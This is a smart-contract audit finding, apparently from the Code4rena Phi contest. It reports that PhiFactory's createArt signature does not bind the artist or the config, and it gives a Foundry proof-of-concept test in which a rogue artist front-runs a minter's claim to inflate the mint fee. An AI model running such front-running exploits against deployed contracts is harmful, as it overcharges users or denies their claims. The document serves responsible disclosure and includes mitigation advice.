# Vulnerability details

## Impact
Artists are marked as trusted in the description of the contest on the C4 Page - [Reference here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/README.md?plain=1#L138-L141).

However, the implementation allows **any arbitrary address to become an artist**. 
A signature is passed when creating an NFT via the `createArt` function, but the signature only serves as proof for the a bonding pair between credId and credChainId, and anyone should be able to generate it.

Even if there are some off-chain limitations by who it could be retrieved, **the signature can be hijacked** from the transaction of any other legitimate artist calling `createArt` in PhiFactory.sol, as it only has expireIn validation, so it can be reused by anyone if `expireIn > block.timestamp`.

Since there is **no enforcement on who can become an artist**, some malicious practices can occur, for example:
- Frontrunning Minter who claims an NFT and calling `updateArtSettings` to change `mintFee`, thereby overcharging the Minter.
- Frontrunning someone who claims an NFT and calling `updateArtSettings` to change `maxSupply`, resulting in a DoS of the `claim()` call. 

## Proof of Concept

SignedData for art creation does not contain anything specific to the Artist or the create art operation itself, it just provides proof for the credId and credChainId pair.

SignedData bonding credId and credChainId should be available to be generated by anyone, even if its not it can be hijacked, if the expireIn has not expired yet.

```solidity
    function createArt(
        bytes calldata signedData_,
        bytes calldata signature_,
@>>     CreateConfig memory createConfig_
    )
    {
@>>     _validateArtCreationSignature(signedData_, signature_);
...
```
Implementation of [validateArtCreationSignature()](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L589-L593) checks only expiryIn. And further checks in the flow lack validations for the artist from the signedData.

Since `CreateConfig` is not included in the signature, we could change any data in it, anyone could proclaim themselves as an Artist!
```solidity
    struct CreateConfig {
@>>     address artist;
@>>     address receiver;
        uint256 endTime;
        uint256 startTime;
        uint256 maxSupply;
        uint256 mintFee;
        bool soulBounded;
    }
```

### Coded PoC
It is mentioned in the audit's details that Artist is a trusted role. But we showcased how any arbitrary address can become an Artist, which is supposed to be a trusted role, because there is no validation enforced.

This PoC showcases how a malicious Artist could front-run a Minter to overcharge him. It is possible for a Minter to be "honeypotted" or baited, as there is a refund mechanism in `_processClaim`, so the Minter could be easily tricked.

```solidity

        PhiArt storage art = arts[artId_];

        // Handle refund

        if ((etherValue_ - mintFee) > 0) {
@>>         _msgSender().safeTransferETH(etherValue_ - mintFee);
        }
        .....
```        

Add this to the PhiFactory.t.sol and use `forge test --match-test testMaliciousArtist -vv`

```solidity
    function testMaliciousArtist() public {
        //======> Malicious artist creates an art. <======//
        // In reallity the signature could be hijacked from legit Artist.
        _createArt(ART_ID_URL_STRING);
        bytes32 expectedRoot = 0xe70e719557c28ce2f2f3545d64c633728d70fbcfe6ae3db5fa01420573e0f34b;
        bytes memory credData = abi.encode(1, owner, "MERKLE", 31_337, expectedRoot); // owner represents credCreator
        bytes memory signCreateData = abi.encode(expiresIn, ART_ID2_URL_STRING, credData);
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(
            signCreateData,
            abi.encodePacked(cr, cs),
            IPhiFactory.CreateConfig(participant, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false)
        );

        //====> Get Proof for the Art to claim art by Malicious Artist <====//
        bytes32[] memory proof = new bytes32[](2);
        proof[0] = 0x0927f012522ebd33191e00fe62c11db25288016345e12e6b63709bb618d777d4;
        proof[1] = 0xdd05ddd79adc5569806124d3c5d8151b75bc81032a0ea21d4cd74fd964947bf5;
        address to = 0x1111111111111111111111111111111111111111;
        bytes32 value = 0x0000000000000000000000000000000003c2f7086aed236c807a1b5000000000;
        uint256 artId = 2;
        bytes memory data = abi.encode(artId, to, proof, referrer, uint256(2), value, IMAGE_URL2);
        bytes memory dataCompressed = LibZip.cdCompress(data);

        //====> Execute Attack <====//

        // Save real fee:
        uint256 realFee = phiFactory.getArtMintFee(artId, 2);

        // FrontRun the claim:
        uint256 newMintFee = MINT_FEE + 0.05 ether;
        IPhiNFT1155Ownable.RoyaltyConfiguration memory newRoyaltyConfig = ICreatorRoyaltiesControl.RoyaltyConfiguration({
            royaltyRecipient: receiver,
            royaltyBPS: 3000 // 30%
         });
        vm.startPrank(participant, participant);
        phiFactory.updateArtSettings(
            artId, ART_ID_URL_STRING, receiver, MAX_SUPPLY, newMintFee, START_TIME, END_TIME, false, newRoyaltyConfig
        );

        // The Claimer/Minters could be a contract that retrieves the fee in real time from getArtMintFee, thus it could
        // be tricked to pay more.
        // We also have refund mechanism in claim() so EOA can also be tricked easily, as EOA could send more than the
        // required fee, expecting refund, but he won't get it, as the malicious Artist will snipe the mempool and
        // frontrun the Minter to increase fees.

        // In the best case where no money is lost the claim() will be DoSed.
        uint256 inflatedFee = phiFactory.getArtMintFee(artId, 2);
        vm.startPrank(participant, participant);
        phiFactory.claim{ value: inflatedFee }(dataCompressed);

        //====> Check the results <====//
        assertTrue(inflatedFee > realFee);
        assertEq(inflatedFee, 0.1209 ether);
        assertEq(realFee, 0.0209 ether);
    }
```    

## Tools Used
Manual Review

## Recommended Mitigation Steps

Reconsider allowing anyone to be an Artist, enforce specific requirements, that may also need to have specific data such as the artist address in the signedData itself, so we could verify who will the artists be. 
And possibly even check if the artist in the signedData is the `msg.sender`.
